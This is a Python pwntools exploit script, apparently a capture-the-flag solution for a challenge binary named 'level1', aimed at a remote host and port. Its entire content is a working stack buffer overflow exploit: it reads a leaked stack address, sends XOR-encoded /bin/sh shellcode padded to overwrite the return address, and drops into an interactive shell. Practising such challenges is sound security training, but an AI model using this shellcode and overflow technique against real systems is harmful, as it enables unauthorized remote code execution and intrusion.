# coding:UTF-8
# author:iopr

from pwn import *
context(os='linux',arch='i386')

Debug=0
if Debug:
    io=process('./level1')
else:
    io=remote("111.198.29.45",44813)

buf=0xBFBD2D70
ret=0xBFBD2DFC
distance=ret-buf
shellcode='\xeb\x0c\x5e\x31\xc9\xb1\x19\xf6\x16\x46\xe2\xfb\xeb\x05\xe8\xef\xff\xff\xff\xce\x3f\xaf\x97\xd0\xd0\x8c\x97\x97\xd0\x9d\x96\x91\x76\x1c\xaf\x76\x1d\xac\x76\x1e\x4f\xf4\x32\x7f'
def main():
    io.recvuntil("What's this:")
    stack_addr=eval(io.recvuntil('?')[0:-1])
    io.recv(timeout=0.1)
    io.sendline(shellcode.ljust(distance,'a')+p32(stack_addr))
    io.interactive()

main()